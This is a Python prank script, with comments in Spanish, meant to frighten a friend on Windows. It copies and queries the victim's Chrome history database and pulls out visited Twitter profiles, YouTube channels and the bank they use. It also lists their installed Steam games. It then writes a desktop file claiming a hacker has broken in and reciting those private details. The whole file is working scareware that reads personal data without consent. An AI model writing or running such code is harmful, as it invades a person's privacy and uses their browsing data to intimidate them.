#Script para asustar a tus amigos creando un archivo con el mensaje de un hacker, tambien para chequear 
#Importando librerias

import os
import re
import sqlite3
from shutil import copyfile
from time import sleep, ctime
from random import randrange

#Creando el archivo donde se guardara la información del script
HACKER_FILE_NAME = "PARA TI.txt"

#Funcion para crear el archivo
def create_hacker_file(desktop_path):
    hacker_file = open(desktop_path + HACKER_FILE_NAME, "w")
    hacker_file.write("Soy un hacker y he entrado en tu sistema\n")
    return hacker_file

#Funcion para obtener el historial de Chrome
def get_chrome_history():
    urls = None
    while not urls:
        try:
            history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Profile 1/History'
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            con = sqlite3.connect(temp_history)
            cursor = con.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            con.close()
            return urls
        except sqlite3.OperationalError as e:
            print("Historial inaccessible, reintentado en 3 segundos")
            sleep(3)

def get_user_path():
    return os.environ['USERPROFILE'] + '/Desktop/'

#Funcion para aplicar un tiempo entre accionses
def delay_action():
    n_houers = randrange(1, 4)
    print(f"Esperando {n_houers} horas")
    sleep(n_houers)

def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write(f"He visto que has visitado los perfiles de Twitter(X) {', '.join(profiles_visited)}, "
                      f"interesante.....")

def check_youtube_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = set()
    forbidden_urls = [
        "https://www.youtube.com/watch",
        "https://www.youtube.com/search",
        "https://www.youtube.com/live",
        "https://www.youtube.com/results"
    ]
    for title, identifier, url in chrome_history:
        chequer = url.startswith("https://www.youtube.com") and not any(url.startswith(x) for x in forbidden_urls)
        channel_name = re.sub(r" - youtube$", "", title, flags=re.IGNORECASE)
        channel_name = re.sub(r"^\(\d+\)\s*", "", channel_name)
        if chequer:
            if channel_name:
                profiles_visited.add(channel_name)
    hacker_file.write(f"\n\nTambien he visto que has visitado los canales de YouTube de {', '.join(profiles_visited)}, "
                      f"ajaaaa.....")

def check_bank_account(hackage_file,chrome_history):
    his_bank = None
    banks = ["Banreservas", "BHD", "Popular"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hackage_file.write(f"\n\nAdemas veo que guardas tu dinero en el banco {his_bank}, ta fichao!!!")

def check_steam_games(hackage_file):
    try:
        steam_path = "C:/Program Files (x86)/Steam/steamapps/common"
        games_listed = os.listdir(steam_path)
        games = []
        for item in games_listed:
            games.append(item.split("\\")[-1])
        hackage_file.write("\n\nTambien he visto que has instalados los juegos de {}... ta fichao".format(", ".join(games)))
    except FileNotFoundError as e:
        print("El usuario no tiene instalado Steam :(")

def main():
    #Esperamos algunas horas para que se ejecute el script
    delay_action()

    #Calculamos la ruta del escritorio del usuario de Windows
    desktop_path = get_user_path()

    # Obtenemos su historial de Google Chrome cuando sea posible
    chrome_history = get_chrome_history()

    #Creamos el archivo del mensaje hacker en el escritorio
    hacker_file = create_hacker_file(desktop_path)

    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_youtube_profiles_and_scare_user(hacker_file,chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)

if __name__ == "__main__":
    main()
